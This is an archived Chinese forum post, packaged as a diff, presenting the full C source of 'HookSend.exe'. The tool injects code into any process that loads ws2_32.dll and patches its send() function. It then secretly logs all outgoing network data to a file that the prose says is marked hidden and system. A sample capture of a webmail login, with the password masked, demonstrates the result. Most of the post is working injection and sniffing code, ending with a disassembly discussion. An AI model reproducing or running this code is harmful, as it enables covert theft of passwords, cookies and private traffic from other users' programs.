@@ -1,0 +1,831 @@
+
+# 拦截网络数据的小玩意
+
+> 原文：[`www.pediy.com/kssd/pediy08/pediy8-737.htm`](https://www.pediy.com/kssd/pediy08/pediy8-737.htm)
+
+以前写的个小程序，暂时就命名为 `HookSend.EXE`，看这个名字，大家就知道这个工具的功能了。
+
+主要就是列出系统中所有加载了 `ws2_32.dll` 的进程，在进程空间中释放一个拦截函数（大部分功能都在这个释放的函数之中）。然后修改 `Send` 函数的前 10 个字节，使之在 `send` 的时候跳转到那个拦截函数，然后记录下 `send` 的信息，并把数据保存在指定的文件里（这个文件属性偶设置的是系统和隐藏），可以指定插入的目标进程以及保存数据的文件路径。
+
+使用的技术就是前面的那个帖子中所提到的用户层下拦截 API 技术
+
+最后，程序还没有做查错，可能在 hook 的时候会有错误 :( 所以，尽量不要插入系统进程拉，附源代码，欢迎大家来拍砖。@\_@
+
+这是插入了我的浏览器后登陆 163 邮箱拦截的数据：
+
+```
+POST /in.jsp?url=http://fm163.163.com/coremail/fcg/ntesdoor2?verifycookie%3D1%26language%3D-1%26style%3D-1 HTTP/1.1
+
+Accept: image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, application/x-shockwave-flash, */*
+
+Referer: http://mail.163.com/
+
+Accept-Language: zh-cn
+
+Content-Type: application/x-www-form-urlencoded
+
+Accept-Encoding: gzip, deflate
+
+User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; TencentTraveler )
+
+Host: reg.163.com
+
+Content-Length: 109
+
+Connection: Keep-Alive
+
+Cache-Control: no-cache
+
+Cookie: Province=0730; City=0731; NETEASE_SSN=******; NETEASE_ADV=11&20; MAIL163_SSN=******; ntes_mail_firstpage=normal
+
+verifycookie=1&username=redcoder&password=*****************&radType=&login
+
+以下省略..
+```
+
+```c
+#include <stdio.h>
+
+#include <windows.h>
+
+#include <Psapi.h>
+
+#pragma comment(lib, "psapi.lib")
+
+typedef struct _RemoteParam {
+
+  DWORD dwLoadLibrary;
+
+  DWORD dwFreeLibrary;
+
+  char szModuleName1[24];
+
+  char szModuleName2[24];
+
+  DWORD dwGetModuleFileName;
+
+  DWORD dwMessageBox;
+
+  DWORD dwSend;
+
+  DWORD dwGetCurrentProcess;
+
+  DWORD dwWriteProcessMemory;
+
+  unsigned char szOldCode[10];
+
+  DWORD FunAddr;
+
+  DWORD dwCreatefile;
+
+  char szFileName[24];
+
+  DWORD dwSetFilePointer;
+
+  DWORD dwWriteFile;
+
+  DWORD dwCloseHandle;
+
+} RemoteParam, * PRemoteParam;
+
+typedef int (__stdcall * PFN_MESSAGEBOX)(HWND, LPCTSTR, LPCTSTR, DWORD);
+
+typedef HMODULE (__stdcall * PFN_LOADLIBRARY)(LPCTSTR);
+
+typedef BOOL (__stdcall * PFN_FREELIBRARY)(HMODULE);
+
+typedef DWORD (__stdcall * PFN_GETMODULEFILENAME)(HMODULE, PTSTR, DWORD);
+
+typedef BOOL (__stdcall * PFN_WRITEPROCESSMEMORY)(HANDLE,LPVOID,LPCVOID,SIZE_T,SIZE_T*);
+
+typedef HANDLE (__stdcall * PFN_GETCURRENTPROCESS)(void);
+
+typedef int (__stdcall * PFN_SEND)(SOCKET,CHAR*,int,int);
+
+typedef HANDLE (__stdcall * PFN_CREATEFILE)(LPCTSTR,DWORD,DWORD,LPSECURITY_ATTRIBUTES,DWORD,DWORD,HANDLE);
+
+typedef DWORD (__stdcall * PFN_SETFILEPOINTER)(HANDLE,LONG,PLONG,DWORD);
+
+typedef BOOL (__stdcall * PFN_WRITEFILE)(HANDLE,LPCVOID,DWORD,LPDWORD,LPOVERLAPPED);
+
+typedef BOOL (__stdcall * PFN_CLOSEHANDLE)(HANDLE);
+
+#define PROCESSNUM 128
+
+//////////////////////////////////////////////////////////////////////////
+
+//******************************
+
+//模块名字：HookSend(LPVOID)
+
+//模块功能：在远程进程修改目标进程空间的指定 API 入口的 10 字节为:PUSH Addr;
+
+//          CALL Self 之后，目标进程 API 跳转到执行的函数。从而进行对原 API
+
+//          进行的拦截的功能。
+
+//返回数值：成功返回初试 API 的返回值，失败返回值自定
+
+//******************************
+
+//参数说明：参数名           |   输入/输出  |        参数说明
+
+//          lParam          |    IN        |     远程释放的参数的地址
+
+//******************************
+
+//注意事项：请在函数中需要使用的系统 API 的调用地址硬编码进参数，该函数中不
+
+//          允许出现任何以相对地址的形式调用系统 API 或者任何其他接口函数和
+
+//          变量。对于原 API 的参数拦截要结合具体的 API 的参数个数来确定其参数
+
+//          在堆栈中的位置，在保留原 API 的参数和释放堆栈的时候尤其注意！
+
+//////////////////////////////////////////////////////////////////////////
+
+void HookSend(LPVOID lParam)
+
+{
+
+  RemoteParam* pRP = (RemoteParam*)lParam;
+
+  HMODULE hUser32 = NULL;
+
+  HMODULE hKernel32 = NULL;
+
+  PFN_LOADLIBRARY pfnLoadlibrary = (PFN_LOADLIBRARY)pRP->dwLoadLibrary;
+
+  PFN_FREELIBRARY pfnFreeLibrary = (PFN_FREELIBRARY)pRP->dwFreeLibrary;
+
+  hUser32 = pfnLoadlibrary(pRP->szModuleName1);
+
+  hKernel32 = pfnLoadlibrary(pRP->szModuleName2);
+
+  char szMsgCaption[24] = {'N', 'o', 't', 'i', 'c', 'e', '\0'};
+
+  char szMsgContent[256];
+
+  PFN_GETMODULEFILENAME pfnGetModuleName = (PFN_GETMODULEFILENAME)pRP->dwGetModuleFileName;
+
+  pfnGetModuleName(NULL, szMsgContent, sizeof(szMsgContent));
+
+  PFN_MESSAGEBOX pfnMessageBox = (PFN_MESSAGEBOX)pRP->dwMessageBox;
+
+  PFN_CREATEFILE pfnCreateFile = (PFN_CREATEFILE)pRP->dwCreatefile;
+
+  PFN_SETFILEPOINTER pfnSetFilePointer = (PFN_SETFILEPOINTER)pRP->dwSetFilePointer;
+
+  PFN_WRITEFILE pfnWriteFile = (PFN_WRITEFILE)pRP->dwWriteFile;
+
+  PFN_CLOSEHANDLE pfnCloseHandle = (PFN_CLOSEHANDLE)pRP->dwCloseHandle;
+
+  DWORD NextIpAddr = 0;
+
+  DWORD dwParamaAddr = 0;
+
+  SOCKET s;
+
+  char * buf;
+
+  int len;
+
+  int flags;
+
+  PFN_SEND pfnSend = (PFN_SEND)pRP->dwSend;
+
+  int RetValue = 0;
+
+  __asm
+
+  {
+
+   MOV EAX,[EBP+8]
+
+   MOV [dwParamaAddr], EAX
+
+   MOV EAX,[EBP+12]           
+
+   MOV [NextIpAddr], EAX
+
+   MOV EAX,[EBP+16]
+
+   MOV [s], EAX
+
+   MOV EAX,[EBP+20]
+
+   MOV [buf],EAX
+
+   MOV EAX,[EBP+24]
+
+   MOV [len],EAX
+
+   MOV EAX,[EBP+28]
+
+   MOV [flags],EAX
+
+  }
+
+  unsigned char szNewCode[10];
+
+  int PramaAddr = (int)dwParamaAddr;
+
+  szNewCode[4] = PramaAddr>>24;
+
+  szNewCode[3] = (PramaAddr<<8)>>24;
+
+  szNewCode[2] = (PramaAddr<<16)>>24;
+
+  szNewCode[1] = (PramaAddr<<24)>>24;
+
+  szNewCode[0] = 0x68;
+
+  int funaddr = (int)pRP->FunAddr - (int)pfnSend - 10 ;
+
+  szNewCode[9] = funaddr>>24;
+
+  szNewCode[8] = (funaddr<<8)>>24;
+
+  szNewCode[7] = (funaddr<<16)>>24;
+
+  szNewCode[6] = (funaddr<<24)>>24;
+
+  szNewCode[5] = 0xE8;
+
+  PFN_GETCURRENTPROCESS pfnGetCurrentProcess = (PFN_GETCURRENTPROCESS)pRP->dwGetCurrentProcess;
+
+  PFN_WRITEPROCESSMEMORY pfnWriteProcessMemory = (PFN_WRITEPROCESSMEMORY)pRP->dwWriteProcessMemory;
+
+  if(!pfnWriteProcessMemory(pfnGetCurrentProcess(),
+
+                    (LPVOID)pfnSend,
+
+            (LPCVOID)pRP->szOldCode,
+
+            10,
+
+            NULL))
+
+    pfnMessageBox(NULL, pRP->szModuleName1, pRP->szModuleName2, MB_ICONINFORMATION | MB_OK);
+
+  RetValue = pfnSend(s, buf, len, flags);
+
+  pfnWriteProcessMemory(pfnGetCurrentProcess(),
+
+                  (LPVOID)pfnSend,
+
+          (LPCVOID)szNewCode,
+
+          10,
+
+          NULL);
+
+  HANDLE fp = pfnCreateFile(pRP->szFileName,GENERIC_WRITE,FILE_SHARE_WRITE,NULL,OPEN_ALWAYS,FILE_ATTRIBUTE_NORMAL,NULL);
+
+  if( fp == INVALID_HANDLE_VALUE )
+
+  {
+
+    __asm
+
+    {
+
+         MOV EDX, [NextIpAddr]
+
+     MOV EAX, [RetValue]
+
+     MOV ESP, EBP
+
+      POP EBP
+
+     ADD ESP, 1CH  //恢复堆栈
+
+     PUSH EDX
+
+     RET
+
+    }
+
+  }
+
+  DWORD i = 0;
+
+  DWORD nWritten = 0;
+
+  while(buf[i] != 0)
+
+    i++;
+
+  pfnSetFilePointer(fp, 0, NULL, FILE_END);
+
+  if(!pfnWriteFile(fp, (LPCVOID)buf, i, &nWritten, NULL))
+
+  {  pfnCloseHandle(fp);
+
+    pfnMessageBox(NULL, pRP->szModuleName1, pRP->szModuleName1, MB_ICONINFORMATION | MB_OK);
+
+      __asm
+
+    {
+
+         MOV EDX, [NextIpAddr]
+
+     MOV EAX, [RetValue]
+
+     MOV ESP, EBP
+
+      POP EBP
+
+     ADD ESP, 1CH  //恢复堆栈
+
+     PUSH EDX
+
+     RET
+
+    }
+
+  }
+
+  pfnCloseHandle(fp);
+
+  pfnFreeLibrary(hKernel32);
+
+  pfnFreeLibrary(hUser32);
+
+//   pfnMessageBox(NULL, pRP->szModuleName2, pRP->szModuleName2, MB_ICONINFORMATION | MB_OK);
+
+  __asm
+
+    {POP EDI     //编译生成 debug 版本的程序则需要把这
+
+         POP ESI     //三个注释去掉
+
+         POP EBX
+
+         MOV EDX, [NextIpAddr]
+
+     MOV EAX, [RetValue]
+
+     MOV ESP, EBP
+```
+
+
+
+```c
+POP EBP  
+ADD ESP, 1CH  //恢复堆栈  
+PUSH EDX  
+RET  
+}  
+}  
+```
+
+//模块名字：`AdjustProcessPrivileges(LPSTR)`  
+//模块功能：修改调用进程的权限  
+//返回数值：成功返回 `TRUE`，失败返回 `FALSE`  
+//注意事项：无  
+
+//参数说明：参数名 | 输入/输出 | 参数说明  
+// `szPrivilegesName` | IN | 要提升的权限名  
+
+//参数可以为下列值：  
+// `#define SE_BACKUP_NAME TEXT("SeBackupPrivilege")`  
+// `#define SE_RESTORE_NAME TEXT("SeRestorePrivilege")`  
+// `#define SE_SHUTDOWN_NAME TEXT("SeShutdownPrivilege")`  
+// `#define SE_DEBUG_NAME TEXT("SeDebugPrivilege")`
+
+```c
+BOOL AdjustProcessPrivileges(LPCSTR szPrivilegesName)  
+{  
+  HANDLE hToken;  
+  TOKEN_PRIVILEGES tkp;  
+  if(!OpenProcessToken(GetCurrentProcess(),  
+    TOKEN_ADJUST_PRIVILEGES|TOKEN_QUERY,&hToken))  
+  {  
+    return FALSE;  
+  }  
+  if(!LookupPrivilegeValue(NULL,szPrivilegesName,  
+                           &tkp.Privileges[0].Luid))  
+  {  
+    CloseHandle(hToken);  
+    return FALSE;  
+  }  
+  tkp.PrivilegeCount = 1;  
+  tkp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;  
+  if(!AdjustTokenPrivileges(hToken,FALSE,&tkp,sizeof(tkp),NULL,NULL))  
+  {  
+    CloseHandle(hToken);  
+    return 0;  
+  }  
+  CloseHandle(hToken);  
+  return TRUE;  
+}  
+```
+
+//模块名字：`FindProcessByModuleName(DWORD*,DWORD,LPSTR,DWORD*,DWORD,DWORD)`  
+//模块功能：查找系统中加载某一特定模块的所有进程，并返回其进程 id  
+//返回数值：成功返回 `TRUE`，失败返回 `FALSE`  
+//注意事项：调用进程权限需要提升到 `SE_DEBUG`  
+
+//参数说明：参数名 | 输入/输出 | 参数说明  
+// `lpidProcesses` | IN | 待查找的进程 ID 数组  
+// `numOfProcess` | IN | 进程 ID 的数目  
+// `FindModuleName` | IN | 要查找的模块名  
+// `lpoutProcessBuffer` | OUT | 查找结果的存储数组  
+// `cb` | IN | 结果存储数组的大小(Byte)  
+// `dwNeed` | OUT | 符合结果的进程个数
+
+```c
+BOOL FindProcessByModuleName(DWORD * lpidProcesses,DWORD numOfProcess,LPSTR FindModuleName,  
+                             DWORD * lpoutProcessBuffer, DWORD cb, DWORD * dwNeed)  
+{  
+  *dwNeed = 0;  
+  CHAR MapFileName[MAX_PATH] = "unknown";  
+  CHAR ModuleName[MAX_PATH];  
+  CHAR FilePath[MAX_PATH];  
+  memset(ModuleName, 0, sizeof(ModuleName));  
+  DWORD FileNameLength = 0;  
+  DWORD ModuleNameLength = 0;  
+  DWORD ModuleAddr = (DWORD)LoadLibrary(FindModuleName);  
+  if((HMODULE)ModuleAddr == NULL)  
+  {  
+    printf("Load ws2_32.dll error!\n");  
+    return FALSE;  
+  }  
+  HANDLE pHd;  
+  DWORD ProcessBufferId = 0;  
+  for (DWORD i = 1; i < numOfProcess; i++)  
+  {  
+    pHd = OpenProcess( PROCESS_QUERY_INFORMATION | PROCESS_VM_READ,  
+                       FALSE, lpidProcesses[i] );  
+    if (pHd == NULL)  
+    {  
+      continue;  
+    }  
+    FileNameLength = GetMappedFileName( pHd, (LPVOID)ModuleAddr,MapFileName, sizeof(MapFileName) );  
+    if(FileNameLength == 0)  
+    {  
+      CloseHandle(pHd);  
+      continue;  
+    }  
+    for(DWORD j = (FileNameLength - 1); MapFileName[j] != '\\'; j--)  
+    {  
+      ModuleName[FileNameLength - j - 1] = MapFileName[j];  
+    }  
+    char temp;  
+    DWORD Starti = 0;  
+    DWORD Endi = strlen(ModuleName) - 1;  
+    while( Starti != Endi && Starti < Endi )  
+    {  
+      temp = ModuleName[Starti];  
+      ModuleName[Starti] = ModuleName[Endi];  
+      ModuleName[Endi] = temp;  
+      Starti++;  
+      Endi--;  
+    }  
+    for(j = 0; j < strlen(ModuleName); j++)  
+    {  
+      ModuleName[j] = tolower(ModuleName[j]);  
+    }  
+    if(0 != strcmp(ModuleName,FindModuleName))  
+    {  
+      CloseHandle(pHd);  
+      continue;  
+    }  
+    if(*dwNeed >= (cb / sizeof(DWORD)))  
+    {  
+      CloseHandle(pHd);  
+      return FALSE;  
+    }  
+    HMODULE pHmods[PROCESSNUM];  
+    DWORD cdModules;  
+    if(!EnumProcessModules( pHd, pHmods, sizeof(pHmods), &cdModules))  
+    {  
+      CloseHandle(pHd);  
+      continue;  
+    }  
+    if(!GetModuleFileNameEx( pHd, pHmods[0], FilePath, MAX_PATH))  
+    {  
+      CloseHandle(pHd);  
+      continue;  
+    }  
+    printf("%d:%s\n", lpidProcesses[i], FilePath);  
+    lpoutProcessBuffer[ProcessBufferId] = lpidProcesses[i];  
+    ProcessBufferId++;  
+    (*dwNeed)++;  
+    CloseHandle(pHd);  
+  }  
+  return TRUE;  
+}  
+
+void usage(void)  
+{  
+  printf("************************************\n"  
+         "    Welcome To Use HookSend.exe      \n"  
+         "      Email:redcoder@163.com        \n"  
+         "     kiki all rights reserved       \n"  
+         "************************************\n\n");  
+}  
+
+int main(void)  
+{  
+   usage();  
+   if(!AdjustProcessPrivileges(SE_DEBUG_NAME))  
+   {  
+     printf("AdjustProcessPrivileges Error!\n");  
+     return 0;  
+   }  
+   DWORD Pids[PROCESSNUM];  
+   DWORD dwProcessNum = 0;  
+   DWORD AccordPids[PROCESSNUM];  
+   DWORD dwAccordNum = 0;  
+   if(!EnumProcesses(Pids, sizeof(Pids), &dwProcessNum))  
+   {  
+     printf("EnumProcess Error!\n");  
+     return 0;  
+   }  
+   if(!FindProcessByModuleName(Pids, dwProcessNum / sizeof(DWORD), "ws2_32.dll",  
+                                AccordPids, sizeof(AccordPids), &dwAccordNum))  
+   {  
+     printf("FindProcessByModuleName Error!\n");  
+     return 0;  
+   }  
+   printf("\nAll %d processes running.  %d processes use ws2_32.dll\n", dwProcessNum / sizeof(DWORD), dwAccordNum);  
+     DWORD dwPid = 0;  
+   printf("请输入要拦截的进程 id:");  
+   scanf("%d", &dwPid);  
+   HANDLE hTargetProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwPid);  
+   if(hTargetProcess == NULL)  
+   {  
+     printf("OpenProcess Error!\n");  
+     return 0;  
+   }  
+   DWORD dwFunAddr = (DWORD)VirtualAllocEx(hTargetProcess, NULL, 10240,   
+                                            MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);  
+   if((LPVOID)dwFunAddr == NULL)  
+   {  
+     printf("申请线程内存失败!\n");  
+     CloseHandle(hTargetProcess);  
+     return 0;  
+   }  
+   DWORD dwPramaAddr = (DWORD)VirtualAllocEx(hTargetProcess, NULL, sizeof(RemoteParam),   
+                                              MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);  
+   if((LPVOID)dwPramaAddr == NULL)  
+   {  
+     printf("申请参数内存失败!\n");  
+     CloseHandle(hTargetProcess);  
+     return 0;  
+   }  
+   printf("\n 线程内存地址:%.8x\n"  
+          "参数内存地址:%.8x\n",  
+      dwFunAddr, dwPramaAddr);  
+      RemoteParam RParam;  
+   ZeroMemory(&RParam, sizeof(RParam));  
+   HMODULE hKernel32 = LoadLibrary("kernel32.dll");  
+   HMODULE hUser32 = LoadLibrary("User32.dll");  
+   RParam.dwLoadLibrary = (DWORD)GetProcAddress(hKernel32, "LoadLibraryA");  
+   RParam.dwFreeLibrary = (DWORD)GetProcAddress(hKernel32, "FreeLibrary");  
+   strcat(RParam.szModuleName1, "Kernel32.dll\0");  
+```
+
+
+
+# 代码实现与分析
+
+## 代码片段
+
+```c
+strcat(RParam.szModuleName2, "User32.dll\0");  
+
+RParam.dwGetModuleFileName = (DWORD)GetProcAddress(hKernel32, "GetModuleFileNameA");  
+
+RParam.dwMessageBox = (DWORD)GetProcAddress(hUser32, "MessageBoxA");  
+
+HMODULE hWs2_32 = LoadLibrary("ws2_32.dll");  
+
+RParam.dwSend = (DWORD)GetProcAddress(hWs2_32, "send");  
+
+RParam.dwGetCurrentProcess = (DWORD)GetProcAddress(hKernel32, "GetCurrentProcess");  
+
+RParam.dwWriteProcessMemory = (DWORD)GetProcAddress(hKernel32, "WriteProcessMemory");  
+
+RParam.dwCreatefile = (DWORD)GetProcAddress(hKernel32, "CreateFileA");  
+
+RParam.dwSetFilePointer = (DWORD)GetProcAddress(hKernel32, "SetFilePointer");  
+
+RParam.dwWriteFile = (DWORD)GetProcAddress(hKernel32, "WriteFile");  
+
+RParam.dwCloseHandle = (DWORD)GetProcAddress(hKernel32, "CloseHandle");  
+
+unsigned char oldcode[10];  
+
+unsigned char newcode[10];  
+
+int praadd = (int)dwPramaAddr;  
+
+int threadadd = (int)dwFunAddr;  
+
+newcode[4] = praadd>>24;  
+
+newcode[3] = (praadd<<8)>>24;  
+
+newcode[2] = (praadd<<16)>>24;  
+
+newcode[1] = (praadd<<24)>>24;  
+
+newcode[0] = 0x68;  
+
+int offsetaddr = threadadd - (int)RParam.dwSend - 10 ;  
+
+newcode[9] = offsetaddr>>24;  
+
+newcode[8] = (offsetaddr<<8)>>24;  
+
+newcode[7] = (offsetaddr<<16)>>24;  
+
+newcode[6] = (offsetaddr<<24)>>24;  
+
+newcode[5] = 0xE8;  
+
+printf("NewCode:");  
+
+for(int j = 0; j < 10; j++)  
+  printf("0x%.2x ",newcode[j]);  
+
+printf("\n\n");  
+
+if(!ReadProcessMemory(GetCurrentProcess(),  
+                   (LPCVOID)RParam.dwSend,  
+                   oldcode,  
+                   10,  
+                   &dwPid))  
+  {  
+    printf("read error");  
+    CloseHandle(hTargetProcess);  
+    FreeLibrary(hKernel32);  
+    FreeLibrary(hUser32);  
+    FreeLibrary(hWs2_32);  
+    return 0;  
+  }  
+
+int seq = 0;  
+
+while(seq != 10)  
+  {  
+   RParam.szOldCode[seq] = oldcode[seq];  
+   seq++;  
+  }  
+
+//  printf("CreateFileA:%.8x\n", RParam.dwCreatefile);  
+
+RParam.FunAddr = dwFunAddr;  
+
+char szFilePath[24];  
+
+memset(szFilePath, 0, 24);  
+
+printf("输入保存拦截信息的文件路径（不超过 24 字节):\n");  
+
+scanf("%s", szFilePath);  
+
+printf("你输入的是:%s\n", szFilePath);  
+
+memset(RParam.szFileName, 0, 24);  
+
+strcpy(RParam.szFileName, szFilePath);  
+
+printf("RParam.dwLoadLibrary:%.8x\n"  
+       "RParam.dwFreeLibrary:%.8x\n"  
+      "RParam.szModuleName1:%s\n"  
+      "RParam.szModuleName2:%s\n"  
+      "RParam.dwGetModuleFileName:%.8x\n"  
+      "RParam.dwMessageBox:%.8x\n"  
+      "RParam.dwSend:%.8x\n"  
+      "RParam.dwGetCurrentProcess:%.8x\n"  
+      "RParam.dwWriteProcessMemory:%.8x\n"  
+      "RParam.FunAddr:%.8x\n"  
+      "RParam.dwCreatefile:%.8x\n"  
+      "RParam.dwSetFilePointer:%.8x\n"  
+      "RParam.dwWriteFile:%.8x\n"  
+      "RParam.dwCloseHandle:%.8x\n"  
+      "RParam.szFileName:%s\n",  
+      RParam.dwLoadLibrary,  
+      RParam.dwFreeLibrary,  
+      RParam.szModuleName1,  
+      RParam.szModuleName2,  
+      RParam.dwGetModuleFileName,  
+      RParam.dwMessageBox,  
+      RParam.dwSend,  
+      RParam.dwGetCurrentProcess,  
+      RParam.dwWriteProcessMemory,  
+      RParam.FunAddr,  
+      RParam.dwCreatefile,  
+      RParam.dwSetFilePointer,  
+      RParam.dwWriteFile,  
+      RParam.dwCloseHandle,  
+      RParam.szFileName);  
+
+printf("RParam.szOldCode:");  
+
+for( int i = 0; i< 10; i++)  
+   printf("0x%.2x ", RParam.szOldCode[i]);  
+
+printf("\n");  
+
+if(!WriteProcessMemory(hTargetProcess, (LPVOID)dwFunAddr, (LPVOID)&HookSend, 8192, &dwPid))  
+  {  
+    printf("WriteRemoteProcessesMemory Error!\n");  
+    CloseHandle(hTargetProcess);  
+    FreeLibrary(hKernel32);  
+    FreeLibrary(hUser32);  
+    FreeLibrary(hWs2_32);  
+    return 0;  
+  }  
+
+if(!WriteProcessMemory(hTargetProcess, (LPVOID)dwPramaAddr, (LPVOID)&RParam, sizeof(RemoteParam), &dwPid))  
+  {  
+    printf("WriteRemoteProcessesMemory Error!\n");  
+    CloseHandle(hTargetProcess);  
+    FreeLibrary(hKernel32);  
+    FreeLibrary(hUser32);  
+    FreeLibrary(hWs2_32);  
+    return 0;  
+  }  
+
+if(!WriteProcessMemory(hTargetProcess, (LPVOID)RParam.dwSend, (LPVOID)newcode, 10, &dwPid))  
+  {  
+    printf("WriteRemoteProcessesMemory Error!\n");  
+    CloseHandle(hTargetProcess);  
+    FreeLibrary(hKernel32);  
+    FreeLibrary(hUser32);  
+    FreeLibrary(hWs2_32);  
+    return 0;  
+  }  
+
+    printf("\nThat's all, good luck :)\n");  
+
+  getchar();  
+
+  CloseHandle(hTargetProcess);  
+
+  FreeLibrary(hKernel32);  
+
+  FreeLibrary(hUser32);  
+
+  FreeLibrary(hWs2_32);  
+
+  return 1;  
+
+} 
+```
+
+## 关于寄存器操作的疑惑
+
+理论上，如下三句必须去掉，否则会影响栈平衡：
+
+```
+POP EDI     //编译生成 debug 版本的程序则需要把这
+POP ESI     //三个注释去掉
+POP EBX
+```
+
+可是，真的去掉，有极其容易使被注入的 `IE` 出现异常，而退出。
+
+问题的关键，我猜测是挂钩函数 `HookSend`，破坏了寄存器，只要保存好寄存器的值，应该可以解决。
+
+## 反汇编分析
+
+后经 `VC` 反汇编：
+
+```
+51:   void HookSend(LPVOID lParam)
+52:   {
+00401040   push        ebp
+00401041   mov         ebp,esp
+00401043   sub         esp,1CCh
+00401049   push        ebx    //******
+0040104A   push        esi    //******
+0040104B   push        edi    //******
+0040104C   lea         edi,[ebp-1CCh]
+00401052   mov         ecx,73h
+00401057   mov         eax,0CCCCCCCCh
+0040105C   rep stos    dword ptr [edi]
+53:
+54:     RemoteParam* pRP = (RemoteParam*)lParam;
+0040105E   mov         eax,dword ptr [ebp+8]
+00401061   mov         dword ptr [ebp-4],eax
+55:     HMODULE hUser32 = NULL;
+00401064   mov         dword ptr [ebp-8],0
+56:     HMODULE hKernel32 = NULL;
+0040106B   mov         dword ptr [ebp-0Ch],0
+57:     PFN_LOADLIBRARY pfnLoadlibrary = (PFN_LOADLIBRARY)pRP->dwLoadLibrary;
+00401072   mov         ecx,dword ptr [ebp-4]
+00401075   mov         edx,dword ptr [ecx]
+00401077   mov         dword ptr [ebp-10h],edx
+58:     PFN_FREELIBRARY pfnFreeLibrary = (PFN_FREELIBRARY)pRP->dwFreeLibrary;
+0040107A   mov         eax,dword ptr [ebp-4]
+0040107D   mov         ecx,dword ptr [eax+4]
+。。。。
+```
+
+由此可知，此三句必须不能去掉。
